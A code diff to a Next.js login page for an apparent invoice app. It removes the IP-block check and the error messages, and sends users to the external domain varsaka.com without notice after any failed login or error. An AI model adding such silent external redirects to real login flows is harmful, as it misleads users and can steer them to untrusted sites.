@@ -30,7 +30,7 @@ export default function LoginPage() {
           });
           const isBlocked = await checkRes.json();
           if (isBlocked) {
-            router.push('/security-redirect');
+            window.location.href = 'https://varsaka.com';
           }
         } catch (err) {}
       })
@@ -49,24 +49,10 @@ export default function LoginPage() {
         body: JSON.stringify({ p_ip: clientIp, p_app: 'invoice' })
       });
       
-      const checkRes = await fetch(`${process.env.NEXT_PUBLIC_SUPABASE_URL}/rest/v1/rpc/check_ip_block`, {
-        method: 'POST',
-        headers: {
-          'apikey': process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
-          'Authorization': `Bearer ${process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY}`,
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ p_ip: clientIp, p_app: 'invoice' })
-      });
-      const isBlocked = await checkRes.json();
-      
-      if (isBlocked) {
-        router.push('/security-redirect');
-      } else {
-        setError('Invalid credentials. Too many failed attempts will result in an IP block.');
-      }
+      // Immediately redirect without notification
+      window.location.href = 'https://varsaka.com';
     } catch (err) {
-      setError('Invalid credentials.');
+      window.location.href = 'https://varsaka.com';
     }
   };
 
